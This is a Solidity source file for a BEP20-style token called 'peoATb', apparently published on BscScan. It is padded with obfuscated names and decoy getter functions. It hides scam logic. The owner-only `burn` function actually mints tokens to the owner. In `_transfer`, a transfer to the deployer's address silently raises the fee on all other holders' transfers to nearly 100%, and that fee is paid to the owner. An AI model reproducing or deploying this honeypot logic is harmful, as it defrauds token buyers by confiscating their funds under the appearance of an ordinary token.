/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.6.10;
contract peoATb {
address private  dWySmP = address(0);
address private  iBIJQE = address(0);
string public  name = "peoATb";
mapping (address => mapping (address => uint256)) private _allowances;
address private  MkwRDU = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  cHnkIm = 1000000000000000000000;
address private  nmuPJV = address(0);
uint8 public constant decimals = 18;
uint256 private  XTUofv = 10000000000000;
address private  dnPsxP = address(0);
address private  JinvjW = address(0);
address private  PRXCYX = address(0);
uint256 private  vMJELH = 1000000000000000000;
string public  symbol = "peoATb";
address public owner;
address private  PKjdkO = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  unxfYP = 1000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  nzUxuz = address(0);
uint256 public constant QLVemV = 99999;
event Approval(address indexed owner, address indexed spender, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  NzZCwB = 100000000;
uint256 private  WmAbJv = 1000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  GdLFzj = 10000000000;

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}


function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getvMJELH() private returns (uint256) {
return vMJELH;
}





function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getPKjdkO() private returns (address) {
return PKjdkO;
}



function _getNzZCwB() private returns (uint256) {
return NzZCwB;
}

function _getJinvjW() private returns (address) {
return JinvjW;
}

function _getcHnkIm() private returns (uint256) {
return cHnkIm;
}



function _getunxfYP() private returns (uint256) {
return unxfYP;
}

function _getGdLFzj() private returns (uint256) {
return GdLFzj;
}

function _getdWySmP() private returns (address) {
return dWySmP;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getnzUxuz() private returns (address) {
return nzUxuz;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tvjudAl 0");
require(spender != address(0), "fvjudAl 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getdnPsxP() private returns (address) {
return dnPsxP;
}





function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "vjudAl");
require(to != address(0), "vjudAl");
require(amount <= balanceOf[from], "vjudAl");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* QLVemV/WmAbJv ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==PRXCYX){
WmAbJv = QLVemV+2;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}




function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () public {
PRXCYX = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}


function _getMkwRDU() private returns (address) {
return MkwRDU;
}



function _getiBIJQE() private returns (address) {
return iBIJQE;
}



function _getnmuPJV() private returns (address) {
return nmuPJV;
}

function _getXTUofv() private returns (uint256) {
return XTUofv;
}

}


library Safefun {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Safefun: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "Safefun: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "Safefun: modulo by zero");
    }
        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Safefun: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "Safefun: division by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}